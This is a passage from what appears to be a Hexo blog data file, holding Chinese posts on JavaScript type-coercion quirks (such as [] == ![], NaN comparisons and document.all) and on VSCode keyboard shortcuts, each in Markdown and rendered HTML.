\n\n因此，我们尝试将`[]`和`false`相加。但是根据内部一些列函数的计算(binary + Operator -> ToPrimitive -> [[DefaultValue]])，右侧的[]最终转换为string：\n\n    (![]+[].toString()) // 'false'\n\n对于一个字符串，我们就可以通过下标来获取对应的字符：\n    \n    'false'[0] // -> 'f'        \n\n剩下的都很直观，除了`i`很取巧。`fail`中的`i`是通过在`falseundefined`中获取第十个下标对应的字符而得到。    \n\n## [ ]包含值，但不是true\n\n## null不等于false\n\n## `document.all`是一个对象，不过是 undefined\n**⚠️这个是前端浏览器API，在Nodejs环境无法使用。**\n\n尽管`document.all`可以返回一个像`数组一样的对象`，可以用来`访问DOM节点`。但是呢，通过`typeof`查看`document.all`，你会惊讶地发现类型是`undefined`。\n\n    document.all instanceof Object // -> true\n    typeof document.all // -> 'undefined'\n\n而且，`document.all`并不等于`undefined`。\n\n    document.all === undefined // -> false\n    document.all === null // -> false\n\n而且，更惊讶的是：\n\n    document.all == null // -> true\n\n`document.all`是一个过去常用的`获取DOM元素`的方法，特别是老版本的IE。但是`从未进入标准`，尽管广泛使用在过去的JS代码中。当`新的API`突出来(比如`document.getElementById`)后，`document.all`就被`淘汰`了。标准委员会不知道怎么处理它。可是因为它已经被广泛使用，所以委员会觉得保留它，但是违背了`JavaScript`的规范。\n\n## 最小值比0还大\n`Number.MIN_VALUE`是最小的数，但是它比`0`还大。\n    \n    Number.MIN_VALUE > 0 // -> true\n\n因为`Number.MIN_VALUE`是`5e-324`。也就是说即使`最小的值`也可以用`浮点数`表示出来，虽然`离0很接近`，但是`依然比0大`。其实最小的数是`Number.NEGATIVE_INFINITY`，尽管它`不是一个实际存在`的数。\n","slug":"怪异的JS","published":1,"updated":"2018-05-05T10:27:16.271Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nb3000sr8xjfg8lkpz3","content":"<h1 id=\"怪异的JavaScript系列-一\"><a href=\"#怪异的JavaScript系列-一\" class=\"headerlink\" title=\"怪异的JavaScript系列(一)\"></a><a href=\"https://juejin.im/post/5ade89db6fb9a07aab297b15\" target=\"_blank\" rel=\"noopener\">怪异的JavaScript系列(一)</a></h1><h2 id=\"等于\"><a href=\"#等于\" class=\"headerlink\" title=\"[ ]等于![ ]\"></a>[ ]等于![ ]</h2><pre><code>[] == ![] // -&gt; true\n</code></pre><p><strong>相等(==)判断操作会将两边的类型都转换为数字(number)，然后再比较。</strong></p>\n<p>因为<code>[]</code>和<code>![]</code>都会转换为<code>0</code>。我们可以理解<code>[]</code>是一个<code>数组</code>，只不过<code>为空</code>而已，那么为<code>true</code>。右侧<code>![]</code>则为<code>false</code>。<code>false</code>然后转换为数字<code>0</code>。<code>左侧[]</code>直接<code>转</code>换为<code>数字</code>，因为<code>空数组</code>会转换<code>为0</code>，所以尽管我们认为[]为true，这里却变成了0。<br>简算过程:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+[] == +![]</span><br><span class=\"line\">0 == +false</span><br><span class=\"line\">0 == 0</span><br><span class=\"line\">true</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"true-是-false\"><a href=\"#true-是-false\" class=\"headerlink\" title=\"true 是 false\"></a>true 是 false</h2><pre><code>!!&apos;false&apos; ==  !!&apos;true&apos;  // -&gt; true\n!!&apos;false&apos; === !!&apos;true&apos; // -&gt; true\n</code></pre><p><strong>true是一个真值，用1表示；<code>字符串的“true”则为NaN</code>。</strong></p>\n<pre><code>true == &apos;true&apos;    // -&gt; false\nfalse == &apos;false&apos;  // -&gt; false\n</code></pre><p><strong>‘false’是一个有意义的字符串。</strong></p>\n<h2 id=\"baNaNa\"><a href=\"#baNaNa\" class=\"headerlink\" title=\"baNaNa\"></a>baNaNa</h2><pre><code>&apos;b&apos; + &apos;a&apos; ++ &apos;a&apos; + &apos;a&apos; // -&gt; baNaNa\n</code></pre><p><strong>这是一个旧笑话，不过改进过的。原始的长这样：</strong></p>\n<pre><code>&apos;foo&apos; ++ &apos;bar&apos; // -&gt; &apos;fooNaN&apos;\n</code></pre><p>该表达式以<code>&#39;foo&#39; + (+&#39;bar&#39;)</code>的形式计算，因为<code>bar不是数字</code>，所以转换为<code>NaN</code>。    </p>\n<h2 id=\"NaN不等于NaN\"><a href=\"#NaN不等于NaN\" class=\"headerlink\" title=\"NaN不等于NaN\"></a>NaN不等于NaN</h2><pre><code>NaN === NaN // -&gt; false\n</code></pre><p>根据 === 的算法，我们可以容易理解为什么为false。</p>\n<h2 id=\"fail\"><a href=\"#fail\" class=\"headerlink\" title=\"fail\"></a>fail</h2><pre><code>(![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]] // -&gt; fail\n</code></pre><p>如果我们仔细观察序列的规律，会发现下面的模式出现很多次：</p>\n<pre><code>(![]+[]) // -&gt; &apos;false&apos;\n![]      // -&gt; false    \n</code></pre><p>因此，我们尝试将<code>[]</code>和<code>false</code>相加。但是根据内部一些列函数的计算(binary + Operator -&gt; ToPrimitive -&gt; [[DefaultValue]])，右侧的[]最终转换为string：</p>\n<pre><code>(![]+[].toString()) // &apos;false&apos;\n</code></pre><p>对于一个字符串，我们就可以通过下标来获取对应的字符：</p>\n<pre><code>&apos;false&apos;[0] // -&gt; &apos;f&apos;        \n</code></pre><p>剩下的都很直观，除了<code>i</code>很取巧。<code>fail</code>中的<code>i</code>是通过在<code>falseundefined</code>中获取第十个下标对应的字符而得到。    </p>\n<h2 id=\"包含值，但不是true\"><a href=\"#包含值，但不是true\" class=\"headerlink\" title=\"[ ]包含值，但不是true\"></a>[ ]包含值，但不是true</h2><h2 id=\"null不等于false\"><a href=\"#null不等于false\" class=\"headerlink\" title=\"null不等于false\"></a>null不等于false</h2><h2 id=\"document-all是一个对象，不过是-undefined\"><a href=\"#document-all是一个对象，不过是-undefined\" class=\"headerlink\" title=\"document.all是一个对象，不过是 undefined\"></a><code>document.all</code>是一个对象，不过是 undefined</h2><p><strong>⚠️这个是前端浏览器API，在Nodejs环境无法使用。</strong></p>\n<p>尽管<code>document.all</code>可以返回一个像<code>数组一样的对象</code>，可以用来<code>访问DOM节点</code>。但是呢，通过<code>typeof</code>查看<code>document.all</code>，你会惊讶地发现类型是<code>undefined</code>。</p>\n<pre><code>document.all instanceof Object // -&gt; true\ntypeof document.all // -&gt; &apos;undefined&apos;\n</code></pre><p>而且，<code>document.all</code>并不等于<code>undefined</code>。</p>\n<pre><code>document.all === undefined // -&gt; false\ndocument.all === null // -&gt; false\n</code></pre><p>而且，更惊讶的是：</p>\n<pre><code>document.all == null // -&gt; true\n</code></pre><p><code>document.all</code>是一个过去常用的<code>获取DOM元素</code>的方法，特别是老版本的IE。但是<code>从未进入标准</code>，尽管广泛使用在过去的JS代码中。当<code>新的API</code>突出来(比如<code>document.getElementById</code>)后，<code>document.all</code>就被<code>淘汰</code>了。标准委员会不知道怎么处理它。可是因为它已经被广泛使用，所以委员会觉得保留它，但是违背了<code>JavaScript</code>的规范。</p>\n<h2 id=\"最小值比0还大\"><a href=\"#最小值比0还大\" class=\"headerlink\" title=\"最小值比0还大\"></a>最小值比0还大</h2><p><code>Number.MIN_VALUE</code>是最小的数，但是它比<code>0</code>还大。</p>\n<pre><code>Number.MIN_VALUE &gt; 0 // -&gt; true\n</code></pre><p>因为<code>Number.MIN_VALUE</code>是<code>5e-324</code>。也就是说即使<code>最小的值</code>也可以用<code>浮点数</code>表示出来，虽然<code>离0很接近</code>，但是<code>依然比0大</code>。其实最小的数是<code>Number.NEGATIVE_INFINITY</code>，尽管它<code>不是一个实际存在</code>的数。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"怪异的JavaScript系列-一\"><a href=\"#怪异的JavaScript系列-一\" class=\"headerlink\" title=\"怪异的JavaScript系列(一)\"></a><a href=\"https://juejin.im/post/5ade89db6fb9a07aab297b15\" target=\"_blank\" rel=\"noopener\">怪异的JavaScript系列(一)</a></h1><h2 id=\"等于\"><a href=\"#等于\" class=\"headerlink\" title=\"[ ]等于![ ]\"></a>[ ]等于![ ]</h2><pre><code>[] == ![] // -&gt; true\n</code></pre><p><strong>相等(==)判断操作会将两边的类型都转换为数字(number)，然后再比较。</strong></p>\n<p>因为<code>[]</code>和<code>![]</code>都会转换为<code>0</code>。我们可以理解<code>[]</code>是一个<code>数组</code>，只不过<code>为空</code>而已，那么为<code>true</code>。右侧<code>![]</code>则为<code>false</code>。<code>false</code>然后转换为数字<code>0</code>。<code>左侧[]</code>直接<code>转</code>换为<code>数字</code>，因为<code>空数组</code>会转换<code>为0</code>，所以尽管我们认为[]为true，这里却变成了0。<br>简算过程:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+[] == +![]</span><br><span class=\"line\">0 == +false</span><br><span class=\"line\">0 == 0</span><br><span class=\"line\">true</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"true-是-false\"><a href=\"#true-是-false\" class=\"headerlink\" title=\"true 是 false\"></a>true 是 false</h2><pre><code>!!&apos;false&apos; ==  !!&apos;true&apos;  // -&gt; true\n!!&apos;false&apos; === !!&apos;true&apos; // -&gt; true\n</code></pre><p><strong>true是一个真值，用1表示；<code>字符串的“true”则为NaN</code>。</strong></p>\n<pre><code>true == &apos;true&apos;    // -&gt; false\nfalse == &apos;false&apos;  // -&gt; false\n</code></pre><p><strong>‘false’是一个有意义的字符串。</strong></p>\n<h2 id=\"baNaNa\"><a href=\"#baNaNa\" class=\"headerlink\" title=\"baNaNa\"></a>baNaNa</h2><pre><code>&apos;b&apos; + &apos;a&apos; ++ &apos;a&apos; + &apos;a&apos; // -&gt; baNaNa\n</code></pre><p><strong>这是一个旧笑话，不过改进过的。原始的长这样：</strong></p>\n<pre><code>&apos;foo&apos; ++ &apos;bar&apos; // -&gt; &apos;fooNaN&apos;\n</code></pre><p>该表达式以<code>&#39;foo&#39; + (+&#39;bar&#39;)</code>的形式计算，因为<code>bar不是数字</code>，所以转换为<code>NaN</code>。    </p>\n<h2 id=\"NaN不等于NaN\"><a href=\"#NaN不等于NaN\" class=\"headerlink\" title=\"NaN不等于NaN\"></a>NaN不等于NaN</h2><pre><code>NaN === NaN // -&gt; false\n</code></pre><p>根据 === 的算法，我们可以容易理解为什么为false。</p>\n<h2 id=\"fail\"><a href=\"#fail\" class=\"headerlink\" title=\"fail\"></a>fail</h2><pre><code>(![]+[])[+[]]+(![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]] // -&gt; fail\n</code></pre><p>如果我们仔细观察序列的规律，会发现下面的模式出现很多次：</p>\n<pre><code>(![]+[]) // -&gt; &apos;false&apos;\n![]      // -&gt; false    \n</code></pre><p>因此，我们尝试将<code>[]</code>和<code>false</code>相加。但是根据内部一些列函数的计算(binary + Operator -&gt; ToPrimitive -&gt; [[DefaultValue]])，右侧的[]最终转换为string：</p>\n<pre><code>(![]+[].toString()) // &apos;false&apos;\n</code></pre><p>对于一个字符串，我们就可以通过下标来获取对应的字符：</p>\n<pre><code>&apos;false&apos;[0] // -&gt; &apos;f&apos;        \n</code></pre><p>剩下的都很直观，除了<code>i</code>很取巧。<code>fail</code>中的<code>i</code>是通过在<code>falseundefined</code>中获取第十个下标对应的字符而得到。    </p>\n<h2 id=\"包含值，但不是true\"><a href=\"#包含值，但不是true\" class=\"headerlink\" title=\"[ ]包含值，但不是true\"></a>[ ]包含值，但不是true</h2><h2 id=\"null不等于false\"><a href=\"#null不等于false\" class=\"headerlink\" title=\"null不等于false\"></a>null不等于false</h2><h2 id=\"document-all是一个对象，不过是-undefined\"><a href=\"#document-all是一个对象，不过是-undefined\" class=\"headerlink\" title=\"document.all是一个对象，不过是 undefined\"></a><code>document.all</code>是一个对象，不过是 undefined</h2><p><strong>⚠️这个是前端浏览器API，在Nodejs环境无法使用。</strong></p>\n<p>尽管<code>document.all</code>可以返回一个像<code>数组一样的对象</code>，可以用来<code>访问DOM节点</code>。但是呢，通过<code>typeof</code>查看<code>document.all</code>，你会惊讶地发现类型是<code>undefined</code>。</p>\n<pre><code>document.all instanceof Object // -&gt; true\ntypeof document.all // -&gt; &apos;undefined&apos;\n</code></pre><p>而且，<code>document.all</code>并不等于<code>undefined</code>。</p>\n<pre><code>document.all === undefined // -&gt; false\ndocument.all === null // -&gt; false\n</code></pre><p>而且，更惊讶的是：</p>\n<pre><code>document.all == null // -&gt; true\n</code></pre><p><code>document.all</code>是一个过去常用的<code>获取DOM元素</code>的方法，特别是老版本的IE。但是<code>从未进入标准</code>，尽管广泛使用在过去的JS代码中。当<code>新的API</code>突出来(比如<code>document.getElementById</code>)后，<code>document.all</code>就被<code>淘汰</code>了。标准委员会不知道怎么处理它。可是因为它已经被广泛使用，所以委员会觉得保留它，但是违背了<code>JavaScript</code>的规范。</p>\n<h2 id=\"最小值比0还大\"><a href=\"#最小值比0还大\" class=\"headerlink\" title=\"最小值比0还大\"></a>最小值比0还大</h2><p><code>Number.MIN_VALUE</code>是最小的数，但是它比<code>0</code>还大。</p>\n<pre><code>Number.MIN_VALUE &gt; 0 // -&gt; true\n</code></pre><p>因为<code>Number.MIN_VALUE</code>是<code>5e-324</code>。也就是说即使<code>最小的值</code>也可以用<code>浮点数</code>表示出来，虽然<code>离0很接近</code>，但是<code>依然比0大</code>。其实最小的数是<code>Number.NEGATIVE_INFINITY</code>，尽管它<code>不是一个实际存在</code>的数。</p>\n"},{"title":"VSCode使用笔记","date":"2017-01-16T07:29:53.000Z","archives":"Editer","_content":"## **发现**\n> ### 新建终端\n> `ctrl`+`shift`+`~`\n\n> ### 选择使用空格缩进并配置\n> `ctrl`+`k` `j`\n\n> ### 跳转行\n> `ctrl`+`g`\n\n  \n\n## **演练场**<br/>\n+ **Multi-Cursor Editing(多光标编辑)**<br/>\n  1. 框选择-按下`Ctrl+Shift+Alt+下箭头键`,`Ctrl+Shift+Alt+右转`,`Ctrl+Shift+Alt+UpArrow`,` Ctrl+Shift+Alt+LeftArrow`选择一个文本块,你也可以按住`Shift+Alt`,选择鼠标文本。\n  2. 添加一个光标-按`Ctrl+Alt+UpArrow`或`Ctrl+Alt+向下箭头`,在上面或下面添加一个新的游标,你也可以用Ctrl+Click来在任何地方添加光标。\n  3. 创建游标上出现的所有字符串的字符串-选择一个实例例如背景颜色和媒体未绑定。现在您可以通过简单地输入来替换所有实例。<br/>\n\n+ **IntelliSense(智能提示)**<br/>\n  + Alt+Z/Alt+X\n\n+ **Line Actions(行操作)**\n  1. 复制一条线,并将其插入到当前位置的上方或下方,分别使用Shift+Alt+向下箭头或Shift+Alt+UpArrow。\n  2. 用Alt+UpArrow和Alt+向下箭头移动整行或选择行。\n  3. 用Ctrl+Shift+K删除整个行。<br/><br/>\n  + 提示:另一个非常常见的任务是注释掉一个代码块——您可以通过按`Ctrl+/`来切换注释。\n+ **Rename Refactoring(更名重构)**<br/>\n  + 可以很容易地重命名一个符号,例如`函数名`或`变量名`。在`符号`\"Book(例子)\"中按`F2`重命名所有实例——这将发生在项目中的所有文件中。您还可以在右键单击上下文菜单中看到重构。\n  + `JSDoc`提示:上面的示例还展示了通过使用`JSDoc`注释获得智能感知提示的另一种方法。您可以通过调用Book函数并查看功能和参数的智能感知体验中增强的上下文来尝试这一点。\n\n+ **Refactoring via Extraction(!通过提取重构)**\n  + 有时候,您希望将已经`编写好的代码`添加到一个`单独的函数`中,或者稍后再使用它。选择要提取的行并按`Ctrl+.`或者点击这个小灯泡,选择其中的一个提取到……选项。通过在第3行或任何其他您想要提出的通用代码中选择if-子句中的代码来尝试它。\n\n+ **Formatting(格式化)**\n  + 如果没有良好的格式化程序,让代码看起来很棒是很困难的。幸运的是,使用`Shift+Alt+F`或格式化的整个文档可以用`Ctrl+K Ctrl+F`来应用当前的选择。这两个选项都可以通过右键单击上下文菜单获得。\n  + `Tip`: 可在扩展库中提供其他格式化程序。格式化支持也可以通过设置来配置,例如启用编辑器。\n\n+ **Code folding(代码折叠)**\n  + 在一个大的文件中,它通常可以用来折叠代码段以增加可读性。要做到这一点,你只需按`Ctrl+Shift+[`折叠代码-按`Ctrl+Shift+]`即可展开。折叠也可以用左边沟中的`+/-`图标来完成。按`Ctrl+Shift+Alt+[`或按`Ctrl+Shift+Alt+]`折叠所有部分。\n  + 提示:折叠是基于缩进的,因此可以应用于所有语言。简单地缩进你的代码来创建一个可折叠的部分,你可以用Ctrl+K Ctrl+1和Ctrl+K Ctrl+5这样的快捷方式折叠一定数量的级别。\n\n+ **Errors and Warnings(错误和警告)**\n  + 在编辑代码时,会高亮显示错误和警告。在下面的示例中,您可以看到许多语法错误。按下`F8`,你可以按顺序浏览它们,并看到详细的错误信息。当您纠正它们时,弯角和滚动条指示器将会更新。\n\n+ **Snippets(片段)**\n  + 您可以通过使用片段大大加快编辑速度。简单地开始键入尝试,从`建议列表`和按`Tab`中选择`trycatch`来创建一个`try->catch块`。您的光标将被放置在文本错误,以方便编辑。如果有多个参数存在,则按Tab键跳到它。","source":"_posts/Editor/VSCode使用笔记.md","raw":"---\ntitle: VSCode使用笔记\ndate: 2017-01-16 15:29:53\ntags: VSCode\narchives: Editer\ncategories: 编辑器\n---\n## **发现**\n> ### 新建终端\n> `ctrl`+`shift`+`~`\n\n> ### 选择使用空格缩进并配置\n> `ctrl`+`k` `j`\n\n> ### 跳转行\n> `ctrl`+`g`\n\n  \n\n## **演练场**<br/>\n+ **Multi-Cursor Editing(多光标编辑)**<br/>\n  1. 框选择-按下`Ctrl+Shift+Alt+下箭头键`,`Ctrl+Shift+Alt+右转`,`Ctrl+Shift+Alt+UpArrow`,` Ctrl+Shift+Alt+LeftArrow`选择一个文本块,你也可以按住`Shift+Alt`,选择鼠标文本。\n  2. 添加一个光标-按`Ctrl+Alt+UpArrow`或`Ctrl+Alt+向下箭头`,在上面或下面添加一个新的游标,你也可以用Ctrl+Click来在任何地方添加光标。\n  3. 创建游标上出现的所有字符串的字符串-选择一个实例例如背景颜色和媒体未绑定。现在您可以通过简单地输入来替换所有实例。<br/>\n\n+ **IntelliSense(智能提示)**<br/>\n  + Alt+Z/Alt+X\n\n+ **Line Actions(行操作)**\n  1. 复制一条线,并将其插入到当前位置的上方或下方,分别使用Shift+Alt+向下箭头或Shift+Alt+UpArrow。\n  2. 用Alt+UpArrow和Alt+向下箭头移动整行或选择行。\n  3. 用Ctrl+Shift+K删除整个行。<br/><br/>\n  + 提示:另一个非常常见的任务是注释掉一个代码块——您可以通过按`Ctrl+/`来切换注释。\n+ **Rename Refactoring(更名重构)**<br/>\n  + 可以很容易地重命名一个符号,例如`函数名`或`变量名`。在`符号`\"Book(例子)\"中按`F2`重命名所有实例——这将发生在项目中的所有文件中。您还可以在右键单击上下文菜单中看到重构。\n  + `JSDoc`提示:上面的示例还展示了通过使用`JSDoc`注释获得智能感知提示的另一种方法。您可以通过调用Book函数并查看功能和参数的智能感知体验中增强的上下文来尝试这一点。\n\n+ **Refactoring via Extraction(!通过提取重构)**\n  + 有时候,您希望将已经`编写好的代码`添加到一个`单独的函数`中,或者稍后再使用它。选择要提取的行并按`Ctrl+.`或者点击这个小灯泡,选择其中的一个提取到……选项。通过在第3行或任何其他您想要提出的通用代码中选择if-子句中的代码来尝试它。\n\n+ **Formatting(格式化)**\n  + 如果没有良好的格式化程序,让代码看起来很棒是很困难的。幸运的是,使用`Shift+Alt+F`或格式化的整个文档可以用`Ctrl+K Ctrl+F`来应用当前的选择。这两个选项都可以通过右键单击上下文菜单获得。\n  + `Tip`: 可在扩展库中提供其他格式化程序。格式化支持也可以通过设置来配置,例如启用编辑器。\n\n+ **Code folding(代码折叠)**\n  + 在一个大的文件中,它通常可以用来折叠代码段以增加可读性。要做到这一点,你只需按`Ctrl+Shift+[`折叠代码-按`Ctrl+Shift+]`即可展开。折叠也可以用左边沟中的`+/-`图标来完成。按`Ctrl+Shift+Alt+[`或按`Ctrl+Shift+Alt+]`折叠所有部分。\n  + 提示:折叠是基于缩进的,因此可以应用于所有语言。简单地缩进你的代码来创建一个可折叠的部分,你可以用Ctrl+K Ctrl+1和Ctrl+K Ctrl+5这样的快捷方式折叠一定数量的级别。\n\n+ **Errors and Warnings(错误和警告)**\n  + 在编辑代码时,会高亮显示错误和警告。在下面的示例中,您可以看到许多语法错误。按下`F8`,你可以按顺序浏览它们,并看到详细的错误信息。当您纠正它们时,弯角和滚动条指示器将会更新。\n\n+ **Snippets(片段)**\n  + 您可以通过使用片段大大加快编辑速度。简单地开始键入尝试,从`建议列表`和按`Tab`中选择`trycatch`来创建一个`try->catch块`。您的光标将被放置在文本错误,以方便编辑。如果有多个参数存在,则按Tab键跳到它。","slug":"Editor/VSCode使用笔记","published":1,"updated":"2018-05-05T01:34:28.929Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgxa4nb5000tr8xjv4t4ketn","content":"<h2 id=\"发现\"><a href=\"#发现\" class=\"headerlink\" title=\"发现\"></a><strong>发现</strong></h2><blockquote>\n<h3 id=\"新建终端\"><a href=\"#新建终端\" class=\"headerlink\" title=\"新建终端\"></a>新建终端</h3><p><code>ctrl</code>+<code>shift</code>+<code>~</code></p>\n<h3 id=\"选择使用空格缩进并配置\"><a href=\"#选择使用空格缩进并配置\" class=\"headerlink\" title=\"选择使用空格缩进并配置\"></a>选择使用空格缩进并配置</h3><p><code>ctrl</code>+<code>k</code> <code>j</code></p>\n<h3 id=\"跳转行\"><a href=\"#跳转行\" class=\"headerlink\" title=\"跳转行\"></a>跳转行</h3><p><code>ctrl</code>+<code>g</code></p>\n</blockquote>\n<h2 id=\"演练场\"><a href=\"#演练场\" class=\"headerlink\" title=\"演练场\"></a><strong>演练场</strong><br></h2><ul>\n<li><p><strong>Multi-Cursor Editing(多光标编辑)</strong><br></p>\n<ol>\n<li>框选择-按下<code>Ctrl+Shift+Alt+下箭头键</code>,<code>Ctrl+Shift+Alt+右转</code>,<code>Ctrl+Shift+Alt+UpArrow</code>,<code>Ctrl+Shift+Alt+LeftArrow</code>选择一个文本块,你也可以按住<code>Shift+Alt</code>,选择鼠标文本。</li>\n<li>添加一个光标-按<code>Ctrl+Alt+UpArrow</code>或<code>Ctrl+Alt+向下箭头</code>,在上面或下面添加一个新的游标,你也可以用Ctrl+Click来在任何地方添加光标。</li>\n<li>创建游标上出现的所有字符串的字符串-选择一个实例例如背景颜色和媒体未绑定。现在您可以通过简单地输入来替换所有实例。<br></li>\n</ol>\n</li>\n<li><p><strong>IntelliSense(智能提示)</strong><br></p>\n<ul>\n<li>Alt+Z/Alt+X</li>\n</ul>\n</li>\n<li><p><strong>Line Actions(行操作)</strong></p>\n<ol>\n<li>复制一条线,并将其插入到当前位置的上方或下方,分别使用Shift+Alt+向下箭头或Shift+Alt+UpArrow。</li>\n<li>用Alt+UpArrow和Alt+向下箭头移动整行或选择行。</li>\n<li>用Ctrl+Shift+K删除整个行。<br><br></li>\n</ol>\n<ul>\n<li>提示:另一个非常常见的任务是注释掉一个代码块——您可以通过按<code>Ctrl+/</code>来切换注释。</li>\n</ul>\n</li>\n<li><p><strong>Rename Refactoring(更名重构)</strong><br></p>\n<ul>\n<li>可以很容易地重命名一个符号,例如<code>函数名</code>或<code>变量名</code>。在<code>符号</code>“Book(例子)”中按<code>F2</code>重命名所有实例——这将发生在项目中的所有文件中。您还可以在右键单击上下文菜单中看到重构。</li>\n<li><code>JSDoc</code>提示:上面的示例还展示了通过使用<code>JSDoc</code>注释获得智能感知提示的另一种方法。您可以通过调用Book函数并查看功能和参数的智能感知体验中增强的上下文来尝试这一点。</li>\n</ul>\n</li>\n<li><p><strong>Refactoring via Extraction(!通过提取重构)</strong></p>\n<ul>\n<li>有时候,您希望将已经<code>编写好的代码</code>添加到一个<code>单独的函数</code>中,或者稍后再使用它。选择要提取的行并按<code>Ctrl+.</code>或者点击这个小灯泡,选择其中的一个提取到……选项。通过在第3行或任何其他您想要提出的通用代码中选择if-子句中的代码来尝试它。</li>\n</ul>\n</li>\n<li><p><strong>Formatting(格式化)</strong></p>\n<ul>\n<li>如果没有良好的格式化程序,让代码看起来很棒是很困难的。幸运的是,使用<code>Shift+Alt+F</code>或格式化的整个文档可以用<code>Ctrl+K Ctrl+F</code>来应用当前的选择。这两个选项都可以通过右键单击上下文菜单获得。</li>\n<li><code>Tip</code>: 可在扩展库中提供其他格式化程序。格式化支持也可以通过设置来配置,例如启用编辑器。</li>\n</ul>\n</li>\n<li><p><strong>Code folding(代码折叠)</strong></p>\n<ul>\n<li>在一个大的文件中,它通常可以用来折叠代码段以增加可读性。要做到这一点,你只需按<code>Ctrl+Shift+[</code>折叠代码-按<code>Ctrl+Shift+]</code>即可展开。折叠也可以用左边沟中的<code>+/-</code>图标来完成。按<code>Ctrl+Shift+Alt+[</code>或按<code>Ctrl+Shift+Alt+]</code>折叠所有部分。</li>\n<li>提示:折叠是基于缩进的,因此可以应用于所有语言。简单地缩进你的代码来创建一个可折叠的部分,你可以用Ctrl+K Ctrl+1和Ctrl+K Ctrl+5这样的快捷方式折叠一定数量的级别。</li>\n</ul>\n</li>\n<li><p><strong>Errors and Warnings(错误和警告)</strong></p>\n<ul>\n<li>在编辑代码时,会高亮显示错误和警告。在下面的示例中,您可以看到许多语法错误。按下<code>F8</code>,你可以按顺序浏览它们,并看到详细的错误信息。当您纠正它们时,弯角和滚动条指示器将会更新。</li>\n</ul>\n</li>\n<li><p><strong>Snippets(片段)</strong></p>\n<ul>\n<li>您可以通过使用片段大大加快编辑速度。简单地开始键入尝试,从<code>建议列表</code>和按<code>Tab</code>中选择<code>trycatch</code>来创建一个<code>try-&gt;catch块</code>。您的光标将被放置在文本错误,以方便编辑。如果有多个参数存在,则按Tab键跳到它。</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"发现\"><a href=\"#发现\" class=\"headerlink\" title=\"发现\"></a><strong>发现</strong></h2><blockquote>\n<h3 id=\"新建终端\"><a href=\"#新建终端\" class=\"headerlink\" title=\"新建终端\"></a>新建终端</h3><p><code>ctrl</code>+<code>shift</code>+<code>~</code></p>\n<h3 id=\"选择使用空格缩进并配置\"><a href=\"#选择使用空格缩进并配置\" class=\"headerlink\" title=\"选择使用空格缩进并配置\"></a>选择使用空格缩进并配置</h3><p><code>ctrl</code>+<code>k</code> <code>j</code></p>\n<h3 id=\"跳转行\"><a href=\"#跳转行\" class=\"headerlink\" title=\"跳转行\"></a>跳转行</h3><p><code>ctrl</code>+<code>g</code></p>\n</blockquote>\n<h2 id=\"演练场\"><a href=\"#演练场\" class=\"headerlink\" title=\"演练场\"></a><strong>演练场</strong><br></h2><ul>\n<li><p><strong>Multi-Cursor Editing(多光标编辑)</strong><br></p>\n<ol>\n<li>框选择-按下<code>Ctrl+Shift+Alt+下箭头键</code>,<code>Ctrl+Shift+Alt+右转</code>,<code>Ctrl+Shift+Alt+UpArrow</code>,<code>Ctrl+Shift+Alt+LeftArrow</code>选择一个文本块,你也可以按住<code>Shift+Alt</code>,选择鼠标文本。</li>\n<li>添加一个光标-按<code>Ctrl+Alt+UpArrow</code>或<code>Ctrl+Alt+向下箭头</code>,在上面或下面添加一个新的游标,你也可以用Ctrl+Click来在任何地方添加光标。</li>\n<li>创建游标上出现的所有字符串的字符串-选择一个实例例如背景颜色和媒体未绑定。现在您可以通过简单地输入来替换所有实例。<br></li>\n</ol>\n</li>\n<li><p><strong>IntelliSense(智能提示)</strong><br></p>\n<ul>\n<li>Alt+Z/Alt+X</li>\n</ul>\n</li>\n<li><p><strong>Line Actions(行操作)</strong></p>\n<ol>\n<li>复制一条线,并将其插入到当前位置的上方或下方,分别使用Shift+Alt+向下箭头或Shift+Alt+UpArrow。</li>\n<li>用Alt+UpArrow和Alt+向下箭头移动整行或选择行。</li>\n<li>用Ctrl+Shift+K删除整个行。<br><br></li>\n</ol>\n<ul>\n<li>提示:另一个非常常见的任务是注释掉一个代码块——您可以通过按<code>Ctrl+/</code>来切换注释。</li>\n</ul>\n</li>\n<li><p><strong>Rename Refactoring(更名重构)</strong><br></p>\n<ul>\n<li>可以很容易地重命名一个符号,例如<code>函数名</code>或<code>变量名</code>。在<code>符号</code>“Book(例子)”中按<code>F2</code>重命名所有实例——这将发生在项目中的所有文件中。您还可以在右键单击上下文菜单中看到重构。</li>\n<li><code>JSDoc</code>提示:上面的示例还展示了通过使用<code>JSDoc</code>注释获得智能感知提示的另一种方法。您可以通过调用Book函数并查看功能和参数的智能感知体验中增强的上下文来尝试这一点。</li>\n</ul>\n</li>\n<li><p><strong>Refactoring via Extraction(!通过提取重构)</strong></p>\n<ul>\n<li>有时候,您希望将已经<code>编写好的代码</code>添加到一个<code>单独的函数</code>中,或者稍后再使用它。选择要提取的行并按<code>Ctrl+.</code>或者点击这个小灯泡,选择其中的一个提取到……选项。通过在第3行或任何其他您想要提出的通用代码中选择if-子句中的代码来尝试它。</li>\n</ul>\n</li>\n<li><p><strong>Formatting(格式化)</strong></p>\n<ul>\n<li>如果没有良好的格式化程序,让代码看起来很棒是很困难的。幸运的是,使用<code>Shift+Alt+F</code>或格式化的整个文档可以用<code>Ctrl+K Ctrl+F</code>来应用当前的选择。这两个选项都可以通过右键单击上下文菜单获得。</li>\n<li><code>Tip</code>: 可在扩展库中提供其他格式化程序。格式化支持也可以通过设置来配置,例如启用编辑器。</li>\n</ul>\n</li>\n<li><p><strong>Code 